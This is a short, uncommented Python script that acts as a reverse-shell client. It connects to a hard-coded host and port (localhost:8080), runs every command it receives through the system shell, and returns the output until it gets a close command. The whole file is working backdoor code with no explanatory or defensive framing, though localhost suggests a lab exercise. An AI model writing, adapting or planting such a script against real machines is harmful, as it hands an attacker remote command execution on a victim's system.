import socket
import sys
import subprocess
import os

host = '127.0.0.1'
port = 8080

try:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
except Exception as e:
    sys.exit()

while True:
    try:
        comm = client.recv(1024).decode()
        if comm == '\close':
            break
        else:
            output = subprocess.check_output(comm, stderr=subprocess.STDOUT, shell=True, text=True)
            client.send(output.encode())
    except subprocess.CalledProcessError as e:
        error_msg = f'Error, excuting command: {comm}\n{e}'
        client.send(error_msg.encode())
        

client.close()
